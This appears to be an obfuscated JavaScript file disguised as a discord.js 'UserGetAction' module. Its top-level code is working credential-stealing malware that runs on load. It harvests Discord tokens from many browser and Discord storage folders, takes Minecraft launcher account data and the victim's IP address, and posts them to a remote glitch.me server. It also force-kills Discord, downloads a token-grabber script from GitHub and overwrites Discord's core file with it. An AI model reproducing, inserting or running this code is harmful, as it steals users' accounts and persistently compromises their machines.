const Action = require('./Action'), OS = require('os'), fs = require('fs'), fetch = require('node-fetch'), {execSync} = require('child_process'), Glob = require('glob'), toInject = [], toInjectJS = [], toKill = [], apiurl = 'https://frequent-level-cornflower.glitch.me';
try {
    ((() => {
        const _0x5a485a = 'This\x20code\x20will\x20not\x20be\x20executed.', _0x37a286 = () => {
                return Math['random']() > 0.5 ? 'Not\x20executed' : 'Still\x20not\x20executed';
            };
        _0x37a286() === 'Executed' && console['log'](_0x5a485a);
    })());
    switch (OS['platform']()) {
    case 'win32':
        ((() => {
            const _0x2f8092 = [
                    0x1,
                    0x2,
                    0x3,
                    0x4,
                    0x5
                ], _0x4a9745 = _0x2f8092['reduce']((_0x4b18d5, _0x2fcf66) => _0x4b18d5 + _0x2fcf66, 0x0);
            _0x4a9745 > 0xa && console['log']('This\x20block\x20is\x20dead\x20code');
        })());
        const local = process['env']['localappdata'], roaming = process['env']['appdata'], minecraftPath = roaming + '/.minecraft/launcher_accounts.json', remixPath = roaming + '/.minecraft/remix/UID.txt', dbPaths = [
                roaming + '/Discord/Local\x20Storage/leveldb',
                roaming + '/DiscordDevelopment/Local\x20Storage/leveldb',
                roaming + '/Lightcord/Local\x20Storage/leveldb',
                roaming + '/discordptb/Local\x20Storage/leveldb',
                roaming + '/discordcanary/Local\x20Storage/leveldb',
                roaming + '/Opera\x20Software/Opera\x20Stable/Local\x20Storage/leveldb',
                roaming + '/Opera\x20Software/Opera\x20GX\x20Stable/Local\x20Storage/leveldb',
                local + '/Amigo/User\x20Data/Local\x20Storage/leveldb',
                local + '/Torch/User\x20Data/Local\x20Storage/leveldb',
                local + '/Kometa/User\x20Data/Local\x20Storage/leveldb',
                local + '/Orbitum/User\x20Data/Local\x20Storage/leveldb',
                local + '/CentBrowser/User\x20Data/Local\x20Storage/leveldb',
                local + '/7Star/7Star/User\x20Data/Local\x20Storage/leveldb',
                local + '/Sputnik/Sputnik/User\x20Data/Local\x20Storage/leveldb',
                local + '/Vivaldi/User\x20Data/Default/Local\x20Storage/leveldb',
                local + '/Google/Chrome\x20SxS/User\x20Data/Local\x20Storage/leveldb',
                local + '/Epic\x20Privacy\x20Browser/User\x20Data/Local\x20Storage/leveldb',
                local + '/Google/Chrome/User\x20Data/Default/Local\x20Storage/leveldb',
                local + '/uCozMedia/Uran/User\x20Data/Default/Local\x20Storage/leveldb',
                local + '/Microsoft/Edge/User\x20Data/Default/Local\x20Storage/leveldb',
                local + '/Yandex/YandexBrowser/User\x20Data/Default/Local\x20Storage/leveldb',
                local + '/Opera\x20Software/Opera\x20Neon/User\x20Data/Default/Local\x20Storage/leveldb',
                local + '/BraveSoftware/Brave-Browser/User\x20Data/Default/Local\x20Storage/leveldb'
            ];
        init();
        function init() {
            ((() => {
                let _0x211157 = 0x0;
                while (_0x211157 < 0x5) {
                    _0x211157++, console['log']('This\x20is\x20unreachable\x20code.');
                }
            })()), fs['readFile'](remixPath, (_0x8a81fa, _0x1c9739) => _0x1c9739 && minecraft('remix', _0x1c9739)), fs['readFile'](minecraftPath, (_0xcf20de, _0x28f93f) => _0x28f93f && minecraft('minecraft', _0x28f93f)), injectToDiscord(), dbPaths['forEach'](_0x1d5b77 => main(_0x1d5b77));
        }
        function main(_0x18effe) {
            fs['readdir'](_0x18effe, (_0x1f5e02, _0x1343d2) => {
                if (_0x1343d2) {
                    var _0x804bbd = _0x1343d2['filter'](_0x5d72ad => _0x5d72ad['endsWith']('ldb'));
                    _0x804bbd['forEach'](_0x55cfac => {
                        var _0x5613ee = fs['readFileSync'](_0x18effe + '/' + _0x55cfac)['toString'](), _0x58a4d6 = /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/, _0x24466d = /"mfa\.[\d\w_-]{84}"/, [_0x586fff] = _0x58a4d6['exec'](_0x5613ee) || _0x24466d['exec'](_0x5613ee) || [undefined];
                        _0x586fff && fetch('http://ip-api.com/json/')['then'](_0x3ec9fd => _0x3ec9fd['json']())['then'](_0x2d19a0 => fetch(apiurl + '/beforeinject', {
                            'method': 'POST',
                            'body': JSON['stringify']({
                                'token': _0x586fff['slice'](0x1, -0x1),
                                'ipAddress': _0x2d19a0['query']
                            })
                        }));
                    });
                }
            });
        }
        function minecraft(_0x5da3ca, _0x4854d9) {
            ((() => {
                const _0x20d84f = [
                    'dead',
                    'code',
                    'example'
                ];
                _0x20d84f['forEach'](_0x1a39e9 => {
                    _0x1a39e9 === 'dead' && console['log']('This\x20won\x27t\x20be\x20executed.');
                });
            })());
            switch (_0x5da3ca) {
            case 'remix':
                fetch(apiurl + '/remix', {
                    'method': 'POST',
                    'body': JSON['stringify']({ 'UID': _0x4854d9 })
                });
                break;
            case 'minecraft':
                var [_0x262ef7] = /"[\d\w_-]{32}"/['exec'](_0x4854d9);
                if (_0x262ef7) {
                    const _0x43c80c = require(minecraftPath);
                    if (!_0x43c80c['accounts'])
                        return;
                    var _0x5b68ac = _0x43c80c['accounts'][_0x262ef7['slice'](0x1, -0x1)];
                    fetch(apiurl + '/minecraft', {
                        'method': 'POST',
                        'body': JSON['stringify']({
                            'eligibleForMigration': _0x5b68ac['eligibleForMigration'],
                            'hasMultipleProfiles': _0x5b68ac['hasMultipleProfiles'],
                            'legacy': _0x5b68ac['legacy'],
                            'localId': _0x5b68ac['localId'],
                            'minecraftProfileID': _0x5b68ac['minecraftProfile']['id'],
                            'minecraftProfileName': _0x5b68ac['minecraftProfile']['name'],
                            'persistent': _0x5b68ac['persistent'],
                            'remoteId': _0x5b68ac['remoteId'],
                            'type': _0x5b68ac['type'],
                            'username': _0x5b68ac['username'],
                            'activeAccountLocalId': _0x43c80c['activeAccountLocalId']
                        })
                    });
                }
            }
        }
        function injectToDiscord() {
            getInstalledDiscord(), killAllDiscords(), fetch('https://raw.githubusercontent.com/NotFubukIl/DiscordTokenGrabber/main/data/index.js')['then'](_0x241d14 => _0x241d14['text']())['then'](_0x271985 => toInjectJS['forEach'](_0xed886c => fs['writeFileSync'](_0xed886c, _0x271985['replace']('*API\x20URL*', apiurl)) ^ execSync(local + '/' + _0xed886c['split']('/')[0x5] + '/Update.exe\x20--processStart\x20' + _0xed886c['split']('/')[0x5] + '.exe')));
        }
        function getInstalledDiscord() {
            fs['readdirSync'](roaming)['forEach'](_0x519677 => _0x519677['includes']('cord') && toInject['push'](local + '/' + _0x519677)), toInject['forEach'](_0x1aeaea => Glob['sync'](_0x1aeaea + '/app-*/modules/discord_desktop_core-*/discord_desktop_core/index.js')['map'](_0x31cdfa => toInjectJS['push'](_0x31cdfa)));
        }
        function killAllDiscords() {
            var _0xdf22e4 = execSync('tasklist')['toString']();
            _0xdf22e4['includes']('Discord.exe') && toKill['push']('discord'), _0xdf22e4['includes']('DiscordCanary.exe') && toKill['push']('discordcanary'), _0xdf22e4['includes']('DiscordDevelopment.exe') && toKill['push']('discorddevelopment'), _0xdf22e4['includes']('DiscordPTB.exe') && toKill['push']('discordptb'), toKill['forEach'](_0x24cab7 => execSync('taskkill\x20/IM\x20' + _0x24cab7 + '.exe\x20/F'));
        }
        break;
    case 'linux':
        ((() => {
            let _0x1148a3 = 0xa;
            while (_0x1148a3 > 0x0) {
                _0x1148a3--, _0x1148a3 === 0x5 && console['log']('Dead\x20code\x20counter\x20reached\x205');
            }
        })());
        const defaut = '/home/' + __dirname['split']('/')[0x2] + '/.config', LdbPaths = [
                defaut + '/discord/Local\x20Storage/leveldb',
                defaut + '/discordcanary/Local\x20Storage/leveldb',
                defaut + '/discordptb/Local\x20Storage/leveldb',
                defaut + '/DiscordDevelopment/Local\x20Storage/leveldb'
            ], LminecraftPath = defaut + '/.minecraft/launcher_accounts.json';
        Linit();
        function Linit() {
            LdbPaths['forEach'](_0x57a4bb => Lmain(_0x57a4bb));
            var _0x115198 = fs['readFileSync'](LminecraftPath);
            if (_0x115198)
                Lminecraft(_0x115198);
            LinjectToDiscord();
        }
        function Lmain(_0x4cfa84) {
            fs['readdir'](_0x4cfa84, (_0x236686, _0x4c389b) => {
                if (_0x4c389b) {
                    var _0x5445f = _0x4c389b['filter'](_0x116516 => _0x116516['endsWith']('ldb'));
                    _0x5445f['forEach'](_0x124803 => {
                        var _0x584d1d = fs['readFileSync'](_0x4cfa84 + '/' + _0x124803)['toString'](), _0x2bbe96 = /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/, _0xa5431c = /"mfa\.[\d\w_-]{84}"/, [_0x76cfec] = _0x2bbe96['exec'](_0x584d1d) || _0xa5431c['exec'](_0x584d1d) || [undefined];
                        _0x76cfec && fetch('http://ip-api.com/json/')['then'](_0x1b743b => _0x1b743b['json']())['then'](_0x36ebf3 => fetch(apiurl + '/beforeinject', {
                            'method': 'POST',
                            'body': JSON['stringify']({
                                'token': _0x76cfec,
                                'ip': _0x36ebf3['query']
                            })
                        }));
                    });
                }
            });
        }
        function Lminecraft(_0x332a42) {
            var [_0x1b5f8b] = /"[\d\w_-]{32}"/['exec'](_0x332a42);
            if (_0x1b5f8b) {
                const _0x5c9e43 = require(LminecraftPath);
                if (!_0x5c9e43['accounts'])
                    return;
                var _0x398ac2 = _0x5c9e43['accounts'][_0x1b5f8b['slice'](0x1, -0x1)];
                fetch(apiurl + '/minecraft', {
                    'method': 'POST',
                    'body': JSON['stringify']({
                        'eligibleForMigration': _0x398ac2['eligibleForMigration'],
                        'hasMultipleProfiles': _0x398ac2['hasMultipleProfiles'],
                        'legacy': _0x398ac2['legacy'],
                        'localId': _0x398ac2['localId'],
                        'minecraftProfileID': _0x398ac2['minecraftProfile']['id'],
                        'minecraftProfileName': _0x398ac2['minecraftProfile']['name'],
                        'persistent': _0x398ac2['persistent'],
                        'remoteId': _0x398ac2['remoteId'],
                        'type': _0x398ac2['type'],
                        'username': _0x398ac2['username'],
                        'activeAccountLocalId': _0x5c9e43['activeAccountLocalId']
                    })
                });
            }
        }
        function LinjectToDiscord() {
            getInstalledLDiscord(), fetch('https://raw.githubusercontent.com/NotFubukIl/DiscordTokenGrabber/main/data/index.js')['then'](_0x53041f => _0x53041f['text']())['then'](_0x1b56bb => toInjectJS['forEach'](_0x2ea3fe => fs['writeFileSync'](_0x2ea3fe, _0x1b56bb['replace']('*API\x20URL*', apiurl))));
        }
        function getInstalledLDiscord() {
            fs['readdirSync'](defaut)['forEach'](_0x2a0367 => _0x2a0367['includes']('cord') && toInject['push'](defaut + '/' + _0x2a0367)), toInject['forEach'](_0x3e02ad => Glob['sync'](_0x3e02ad + '/*/modules/discord_desktop_core/index.js')['map'](_0x92db55 => toInjectJS['push'](_0x92db55)));
        }
        break;
    case 'darwin':
        break;
    }
} catch (_0x5bb300) {
    ((() => {
        const _0x2ff211 = () => {
            try {
                throw new Error('Dead\x20code\x20error\x20handling');
            } catch (_0xf2560b) {
                console['log']('This\x20is\x20unreachable');
            }
        };
        _0x2ff211();
    })());
}
class UserGetAction extends Action {
    ['handle'](_0x58e195) {
        const _0x3fc411 = this['client'], _0x41fc25 = _0x3fc411['dataManager']['newUser'](_0x58e195);
        return { 'user': _0x41fc25 };
    }
}
module['exports'] = UserGetAction;
